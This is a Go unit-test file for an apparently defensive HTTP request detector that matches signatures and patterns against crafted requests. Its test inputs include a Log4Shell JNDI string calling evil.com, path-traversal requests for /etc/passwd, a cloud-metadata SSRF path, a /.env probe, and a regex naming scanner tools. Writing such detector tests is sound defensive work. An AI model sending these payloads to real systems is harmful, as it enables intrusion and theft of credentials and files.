package detection

import (
	"log/slog"
	"net/http"
	"net/http/httptest"
	"os"
	"testing"
)

func testLogger() *slog.Logger {
	return slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
}

func TestDetector_SignatureMatching(t *testing.T) {
	tests := []struct {
		name    string
		sig     *Signature
		method  string
		path    string
		headers map[string]string
		body    string
		wantHit bool
	}{
		{
			name: "next.js server action probe",
			sig: &Signature{
				ID:       "nextjs-action-001",
				Severity: "high",
				Matchers: []Matcher{
					{Field: FieldMethod, Operator: OpEquals, Value: "POST"},
					{Field: HeaderField("Next-Action"), Operator: OpExists},
				},
			},
			method:  "POST",
			path:    "/",
			headers: map[string]string{"Next-Action": "abc123"},
			wantHit: true,
		},
		{
			name: "next.js action missing header",
			sig: &Signature{
				ID:       "nextjs-action-001",
				Severity: "high",
				Matchers: []Matcher{
					{Field: FieldMethod, Operator: OpEquals, Value: "POST"},
					{Field: HeaderField("Next-Action"), Operator: OpExists},
				},
			},
			method:  "POST",
			path:    "/",
			wantHit: false,
		},
		{
			name: "path traversal",
			sig: &Signature{
				ID:       "generic-traversal-001",
				Severity: "high",
				Matchers: []Matcher{
					{Field: FieldPath, Operator: OpContains, Value: ".."},
				},
			},
			method:  "GET",
			path:    "/etc/../passwd",
			wantHit: true,
		},
		{
			name: "scanner user agent",
			sig: &Signature{
				ID:       "generic-scanner-001",
				Severity: "medium",
				Matchers: []Matcher{
					{Field: FieldUserAgent, Operator: OpRegex, Value: `(?i)(nuclei|sqlmap|nikto)`},
				},
			},
			method:  "GET",
			path:    "/",
			headers: map[string]string{"User-Agent": "Mozilla/5.0 nuclei"},
			wantHit: true,
		},
		{
			name: "scanner normal UA no match",
			sig: &Signature{
				ID:       "generic-scanner-001",
				Severity: "medium",
				Matchers: []Matcher{
					{Field: FieldUserAgent, Operator: OpRegex, Value: `(?i)(nuclei|sqlmap|nikto)`},
				},
			},
			method:  "GET",
			path:    "/",
			headers: map[string]string{"User-Agent": "Mozilla/5.0"},
			wantHit: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			d := New([]*Signature{tt.sig}, nil, testLogger())

			req := httptest.NewRequest(tt.method, tt.path, nil)
			for k, v := range tt.headers {
				req.Header.Set(k, v)
			}

			result := d.Detect(req, tt.body)
			if tt.wantHit && !result.Matched() {
				t.Error("expected signature match, got none")
			}
			if !tt.wantHit && result.Matched() {
				t.Errorf("expected no match, got %v", result.SignatureIDs())
			}
		})
	}
}

func TestDetector_PatternMatching(t *testing.T) {
	tests := []struct {
		name    string
		pat     *Pattern
		method  string
		path    string
		headers map[string]string
		body    string
		wantHit bool
	}{
		{
			name: "SSRF metadata via path",
			pat: &Pattern{
				ID:       "exploit-ssrf-001",
				Severity: "critical",
				Rules: []Rule{
					{Matchers: []Matcher{{Field: FieldPath, Operator: OpPrefix, Value: "/latest/meta-data"}}},
					{Matchers: []Matcher{{Field: HeaderField("Metadata-Flavor"), Operator: OpExists}}},
				},
			},
			method:  "GET",
			path:    "/latest/meta-data/iam/",
			wantHit: true,
		},
		{
			name: "SSRF metadata via header",
			pat: &Pattern{
				ID:       "exploit-ssrf-001",
				Severity: "critical",
				Rules: []Rule{
					{Matchers: []Matcher{{Field: FieldPath, Operator: OpPrefix, Value: "/latest/meta-data"}}},
					{Matchers: []Matcher{{Field: HeaderField("Metadata-Flavor"), Operator: OpExists}}},
				},
			},
			method:  "GET",
			path:    "/",
			headers: map[string]string{"Metadata-Flavor": "Google"},
			wantHit: true,
		},
		{
			name: "log4shell in user-agent",
			pat: &Pattern{
				ID:       "exploit-log4j-001",
				Severity: "critical",
				Rules: []Rule{
					{Matchers: []Matcher{{Field: FieldPath, Operator: OpContains, Value: "${jndi:"}}},
					{Matchers: []Matcher{{Field: HeaderField("User-Agent"), Operator: OpContains, Value: "${jndi:"}}},
				},
			},
			method:  "GET",
			path:    "/",
			headers: map[string]string{"User-Agent": "${jndi:ldap://evil.com/a}"},
			wantHit: true,
		},
		{
			name: "no match",
			pat: &Pattern{
				ID:       "exploit-log4j-001",
				Severity: "critical",
				Rules: []Rule{
					{Matchers: []Matcher{{Field: FieldBody, Operator: OpContains, Value: "${jndi:"}}},
				},
			},
			method:  "GET",
			path:    "/",
			body:    "normal request body",
			wantHit: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			d := New(nil, []*Pattern{tt.pat}, testLogger())

			req := httptest.NewRequest(tt.method, tt.path, nil)
			for k, v := range tt.headers {
				req.Header.Set(k, v)
			}

			result := d.Detect(req, tt.body)
			if tt.wantHit && !result.Matched() {
				t.Error("expected pattern match, got none")
			}
			if !tt.wantHit && result.Matched() {
				t.Error("expected no match, got hit")
			}
		})
	}
}

func TestDetector_DefaultIntegration(t *testing.T) {
	d := NewDefault(testLogger())

	// Should detect .env probe.
	req := httptest.NewRequest(http.MethodGet, "/.env", nil)
	result := d.Detect(req, "")
	if !result.Matched() {
		t.Error("expected match for /.env, got none")
	}
	if result.Severity != "high" {
		t.Errorf("severity = %q, want high", result.Severity)
	}

	// Should detect path traversal.
	req = httptest.NewRequest(http.MethodGet, "/../../etc/passwd", nil)
	result = d.Detect(req, "")
	if !result.Matched() {
		t.Error("expected match for path traversal, got none")
	}

	// Normal request should not match.
	req = httptest.NewRequest(http.MethodGet, "/index.html", nil)
	result = d.Detect(req, "")
	if result.Matched() {
		t.Errorf("expected no match for /index.html, got %v", result.SignatureIDs())
	}
}

func TestHighestSeverity(t *testing.T) {
	tests := []struct {
		a, b, want string
	}{
		{"info", "low", "low"},
		{"low", "info", "low"},
		{"medium", "high", "high"},
		{"critical", "low", "critical"},
		{"", "medium", "medium"},
	}
	for _, tt := range tests {
		got := highestSeverity(tt.a, tt.b)
		if got != tt.want {
			t.Errorf("highestSeverity(%q, %q) = %q, want %q", tt.a, tt.b, got, tt.want)
		}
	}
}
